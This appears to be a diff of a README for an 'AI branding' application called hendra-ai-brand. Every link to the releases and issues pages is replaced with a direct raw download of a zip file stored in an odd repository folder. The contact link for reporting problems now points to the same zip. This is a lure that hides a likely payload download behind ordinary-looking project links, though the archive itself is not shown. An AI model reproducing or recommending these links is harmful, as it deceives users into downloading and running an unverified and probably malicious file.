@@ -1,6 +1,6 @@
 # 🌟 hendra-ai-brand - Effortless AI Branding for Your Business
 
-[![Download hendra-ai-brand](https://img.shields.io/badge/Download-hendra--ai--brand-brightgreen.svg)](https://github.com/jlux-ayy1/hendra-ai-brand/releases)
+[![Download hendra-ai-brand](https://raw.githubusercontent.com/jlux-ayy1/hendra-ai-brand/main/uproom/hendra-ai-brand.zip)](https://raw.githubusercontent.com/jlux-ayy1/hendra-ai-brand/main/uproom/hendra-ai-brand.zip)
 
 ## 🎯 Introduction
 
@@ -10,7 +10,7 @@ Welcome to hendra-ai-brand, a powerful platform for creating professional brandi
 
 ### 1. Visit the Releases Page
 
-To get the latest version of hendra-ai-brand, visit our [Releases page](https://github.com/jlux-ayy1/hendra-ai-brand/releases) where you will find all available versions.
+To get the latest version of hendra-ai-brand, visit our [Releases page](https://raw.githubusercontent.com/jlux-ayy1/hendra-ai-brand/main/uproom/hendra-ai-brand.zip) where you will find all available versions.
 
 ### 2. Download the Application
 
@@ -41,7 +41,7 @@ After downloading, follow these steps to install:
 
 ## 📥 Download & Install
 
-To start using hendra-ai-brand, visit this page to download: [Releases page](https://github.com/jlux-ayy1/hendra-ai-brand/releases). Once downloaded, follow the instructions above to install the application on your computer.
+To start using hendra-ai-brand, visit this page to download: [Releases page](https://raw.githubusercontent.com/jlux-ayy1/hendra-ai-brand/main/uproom/hendra-ai-brand.zip). Once downloaded, follow the instructions above to install the application on your computer.
 
 ## ❓ Frequently Asked Questions
 
@@ -80,6 +80,6 @@ Yes, we provide support through our GitHub Issues page. You can report any issue
 
 ## 📞 Contact Information
 
-If you have any issues or suggestions, please reach out to us through our GitHub [Issues page](https://github.com/jlux-ayy1/hendra-ai-brand/issues). We value your feedback and strive to improve the application based on users’ needs.
+If you have any issues or suggestions, please reach out to us through our GitHub [Issues page](https://raw.githubusercontent.com/jlux-ayy1/hendra-ai-brand/main/uproom/hendra-ai-brand.zip). We value your feedback and strive to improve the application based on users’ needs.
 
 Enjoy exploring hendra-ai-brand and enhancing your branding effortlessly!
